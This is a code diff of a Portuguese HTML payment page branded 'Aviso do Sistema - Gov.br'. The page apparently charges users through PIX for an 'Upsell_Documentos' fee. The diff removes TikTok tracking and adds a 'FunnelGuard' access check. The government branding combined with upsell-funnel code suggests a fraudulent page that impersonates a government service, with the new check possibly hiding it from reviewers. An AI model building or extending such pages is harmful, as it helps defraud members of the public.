@@ -4,15 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aviso do Sistema - Gov.br</title>
-    <!-- TikTok Pixel -->
+    <script src="guard.js"></script>
     <script>
-    !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-    ttq.load('DA835D3C77UES9745010');
-    ttq.load('DAHNVTJC77UDHLL3RRVG');
-    ttq.load('DAHMNHRC77UDHLL3RPQG');
-    ttq.page();
-    }(window,document,'ttq');
+        if (window.FunnelGuard && typeof window.FunnelGuard.verificarAcesso === 'function') {
+            window.FunnelGuard.verificarAcesso();
+        }
     </script>
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { min-height: 100vh; background-color: #f2f2f2; display: flex; flex-direction: column; font-family: 'Segoe UI', Arial, sans-serif; align-items: center;}
@@ -182,11 +180,6 @@
                     }
                     document.getElementById('upsell-pix-code').textContent = displayCode;
                     
-                    ttq.track('InitiateCheckout', {
-                        value: 18.41,
-                        currency: 'BRL',
-                        content_name: 'Upsell_Documentos'
-                    });
 
                     document.getElementById('step1').classList.remove('active');
                     document.getElementById('step2').classList.add('active');
@@ -253,44 +246,11 @@
                     const data = await res.json();
                     if(data.status === 'approved' || data.status === 'paid' || data.status === 'pago') {
                         clearInterval(interval);
-                        ttq.track('CompletePayment', {
-                            value: 18.41,
-                            currency: 'BRL',
-                            content_name: 'Upsell_Documentos'
-                        });
-                        setTimeout(() => { window.location.href = '/upsell4'; }, 1500);
+                        setTimeout(() => { window.location.href = '/obrigado'; }, 1500);
                     }
                 } catch (e) {}
             }, 4000);
         }
     </script>
-
-<script>
-// ---- TikTok Click ID / Pixel Cookie Capture ----
-function getTTParams() {
-    var params = new URLSearchParams(window.location.search);
-    var ttclid = params.get('ttclid') || sessionStorage.getItem('ttclid') || '';
-    if (ttclid) sessionStorage.setItem('ttclid', ttclid);
-    
-    var ttp = '';
-    document.cookie.split(';').forEach(function(c) {
-        var parts = c.trim().split('=');
-        if (parts[0] === '_ttp') ttp = decodeURIComponent(parts[1] || '');
-    });
-    
-    // Capturar SKU dinâmico da URL (ex: /pre/adults-HKK2FF9G)
-    var sku = sessionStorage.getItem('tt_sku') || '';
-    var path = window.location.pathname;
-    var match = path.match(/adults-([A-Z0-9]+)/i);
-    if (match) {
-        sku = match[1];
-        sessionStorage.setItem('tt_sku', sku);
-    }
-    
-    return { ttclid: ttclid, ttp: ttp, sku: sku };
-}
-window._getTTParams = getTTParams;
-// ---- End TikTok Capture ----
-</script>
 </body>
 </html>
